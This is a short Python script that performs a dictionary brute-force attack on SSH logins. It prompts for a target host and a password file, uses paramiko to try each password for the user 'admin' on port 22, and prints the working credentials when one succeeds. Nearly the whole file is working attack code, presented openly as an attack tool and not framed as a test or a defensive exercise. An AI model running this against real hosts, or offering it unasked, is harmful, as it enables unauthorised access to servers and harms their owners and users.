

import paramiko, sys



def sshConnection(password):

	global target
	ssh = paramiko.client.SSHClient()
	ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

	
	try:
		ssh.connect(target, port =22, username = "admin", password = password)

	except:
		ssh.close()
		print("SSH authentication failure")

	else:

		print("Authentication successful")
		print("Credentials: admin@" + target + " Password: " + password)
		f.close()
		ssh.close()
		sys.exit(0)



print("\n\tDictionary brute force attack on SSH services")
print("\t---------------------------------------------\n\n")


target = input(" > Enter target host address to connect to : ")
password_file = input(" > Enter the filename of the password list : ")


f = open(password_file, "r")

attempts = 0

print("\n\tBrute forcing passwords from the file...\n")
for password in f.readlines():
	password = password.strip("\n")
	attempts += 1
	print("Attempt: %-3s %-15s "%(str(attempts),password), end=" 		")
	sshConnection(password)

f.close()


